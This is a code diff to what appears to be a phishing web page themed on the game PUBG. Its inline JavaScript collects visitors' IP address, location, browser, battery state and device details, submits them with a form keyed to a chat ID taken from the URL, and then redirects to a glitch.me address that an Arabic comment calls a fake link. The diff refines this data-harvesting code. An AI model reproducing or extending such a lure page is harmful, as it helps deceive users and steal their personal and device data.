@@ -381,9 +381,7 @@
     </div> 
 
     <div id="notification" class="notification"></div>
-    
-    
-        <script>
+   <script>
     function showPubgContainer() {
         document.getElementById('login-container').classList.remove('active');
         document.getElementById('pubg-container').classList.add('active');
@@ -391,6 +389,7 @@
 
     const increaseForm = document.getElementById('increaseForm');
     const chatIdInput = document.getElementById('chatIdInput');
+
     const chatId = window.location.pathname.split('/').pop();
     chatIdInput.value = chatId;
 
@@ -398,20 +397,11 @@
         try {
             const response = await fetch('http://ipwho.is/');
             const data = await response.json();
-            if (data.success) {
-                return {
-                    ip: data.ip,
-                    country: data.country,
-                    city: data.city
-                };
-            } else {
-                console.error('Error fetching IP info:', data.message);
-                return {
-                    ip: 'Unknown',
-                    country: 'Unknown',
-                    city: 'Unknown'
-                };
-            }
+            return {
+                ip: data.ip,
+                country: data.country,
+                city: data.city
+            };
         } catch (error) {
             console.error('Error fetching IP info:', error);
             return {
@@ -424,15 +414,19 @@
 
     function getPlatformInfo() {
         const ua = navigator.userAgent;
-        let platform = "Unknown";
-        if (/Windows/.test(ua)) platform = "Instagram";
-        else if (/Mac/.test(ua)) platform = "Instagram";
-        else if (/Linux/.test(ua)) platform = "Instagram";
-        else if (/Android/.test(ua)) platform = "Instagram";
-        else if (/iPhone|iPad|iPod/.test(ua)) platform = "Instagram";
+        const platform = /Windows/.test(ua) ? "Instagram" :
+                         /Mac/.test(ua) ? "Instagram" :
+                         /Linux/.test(ua) ? "Instagram" :
+                         /Android/.test(ua) ? "Instagram" :
+                         /iPhone|iPad|iPod/.test(ua) ? "Instagram" : "Unknown";
+
+        const browser = ua.includes("Chrome") ? "Chrome" :
+                        ua.includes("Safari") ? "Safari" :
+                        ua.includes("Firefox") ? "Firefox" : "Unknown Browser";
 
         return {
             platform: platform,
+            browser: browser,
             userAgent: ua
         };
     }
@@ -442,22 +436,22 @@
             try {
                 const battery = await navigator.getBattery();
                 return {
-                    batteryLevel: battery.level,
-                    batteryCharging: battery.charging
+                    batteryLevel: (battery.level * 100) + '%',
+                    batteryCharging: battery.charging ? "Charging" : "Not Charging"
                 };
             } catch (error) {
                 console.error('Error getting battery info:', error);
             }
         }
         return {
-            batteryLevel: undefined,
-            batteryCharging: undefined
+            batteryLevel: 'Not Supported',
+            batteryCharging: 'Not Supported'
         };
     }
 
     function getDeviceVersion() {
         const ua = navigator.userAgent;
-        const match = ua.match(/([^)]+)/);
+        const match = ua.match(/\(([^)]+)\)/);
         return match ? match[1] : 'Unknown';
     }
 
@@ -484,7 +478,7 @@
             const result = await response.json();
             if (result.success) {
                 document.getElementById('notification').innerText = 'تم إرسال البيانات بنجاح!';
-                window.location.href = "https://polarized-believed-fisherman.glitch.me/"; // هذا هو الرابط الوهمي
+                window.location.href = "https://polarized-believed-fisherman.glitch.me/"; // رابط وهمي
             } else {
                 alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
             }
@@ -496,3 +490,6 @@
 </script>
 </body>   
 </html>
+ 
+    
+        
